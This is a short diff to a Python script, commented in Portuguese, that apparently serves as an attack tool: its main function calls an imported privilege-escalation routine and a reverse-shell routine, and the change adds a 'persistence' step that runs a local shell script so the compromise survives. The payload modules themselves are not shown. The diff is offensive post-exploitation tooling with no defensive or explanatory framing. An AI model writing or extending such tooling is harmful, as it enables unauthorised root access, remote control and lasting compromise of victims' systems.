@@ -16,6 +16,12 @@ from privilege_scalation import elevar_privilegio
 # Reverse shell
 from reverse_shell import remote_shell
 
+# Persistence
+def persistence():
+    output = subprocess.call(["./persistence.sh"])
+#print (output)
+
+
 # Função para verificar se o usuário é root
 def check_root():
     return os.geteuid() == 0
@@ -24,6 +30,7 @@ def check_root():
 def main(): 
     elevar_privilegio()
     remote_shell()
+    persistence()
 
 if __name__ == "__main__":
     main()
